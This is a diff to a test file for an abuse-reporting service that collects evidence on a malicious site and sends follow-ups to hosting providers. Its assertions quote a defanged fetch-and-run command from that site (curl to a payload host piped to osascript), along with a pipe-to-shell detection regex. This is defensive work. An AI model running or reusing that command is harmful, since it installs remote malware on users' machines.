@@ -2,6 +2,7 @@ import { afterAll, beforeAll, describe, expect, test } from "bun:test";
 import { eq } from "drizzle-orm";
 
 import { getDb } from "../../db";
+import { SubmissionsEntity } from "../../db/entities";
 import { useTemporaryDatabase } from "../../db/test_helpers";
 import { validateAbuseReportRequest } from "../contracts";
 import type { sendAbuseEmailRoute } from "../mail";
@@ -77,6 +78,28 @@ describe("provider decision follow-up", () => {
 		expect(evidence.reproduction[1]).toBe(`curl -s -A "curl/8.7.1" -o payload.bin "https://keychainagent.pro/wksxgj/wZZLR9xY29o4" && shasum -a 256 payload.bin`);
 		expect(evidence.reproduction.join("\n")).not.toMatch(/\|\s*(?:z|ba)?sh\b|osascript\s*$/m);
 		expect(evidence.references[0]).toMatch(/^https:\/\/www\.virustotal\.com\/gui\/file\/[a-f0-9]{64}$/);
+	});
+
+	test("a case's own page that names the reporter's browser is fetched as that browser, never as a payload host", async () => {
+		// Production case 380697679325302795: the page report carries the Mac browser it was captured with.
+		const mac = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36";
+		const seen: string[] = [];
+		const fetcher: EvidenceFetcher = async (url, userAgent) => { seen.push(`${url} ${userAgent}`); return liveWeb()(url, userAgent); };
+		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", reportedUserAgent: mac, fetcher });
+		expect(evidence.liveChecks[0]).toMatchObject({ url: "https://paneo.work/", userAgent: mac, as: "the browser the page targets", status: 200 });
+		expect(evidence.command?.decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 [pipe] osascript -l JavaScript"]);
+		expect(evidence.reproduction[0]).toStartWith(`curl -s -A "${mac}" "https://paneo.work/"`);
+		expect(seen[0]).toBe(`https://paneo.work/ ${mac}`);
+
+		// Through the follow-up: the report's case submitted this site, so it is the page, not a payload host.
+		const { reportId, route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/", mac);
+		const submissionId = 380697679325302799n;
+		await SubmissionsEntity.create({ id: submissionId, kind: "website", data: { kind: "website", website: { url: "https://paneo.work/" } }, dedupeKey: "website-paneo.work-decision-test", status: "reported", source: "https://paneo.work/" });
+		(await getDb()).update(abuseReports).set({ submissionId }).where(eq(abuseReports.id, reportId)).run();
+		const { sent, send } = recordingSend();
+		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, { fetcher: liveWeb(), send, writeNarrative: async () => undefined })).toBe("sent");
+		expect(sent[0]!.body).toContain(`- https://paneo.work/ requested as the browser the page targets (User-Agent "${mac}"): HTTP 200`);
+		expect(sent[0]!.body).toContain("The command the page shows (defanged)");
 	});
 
 	test("a model narrative with links, commands, or a greeting is replaced by the code-owned one", () => {
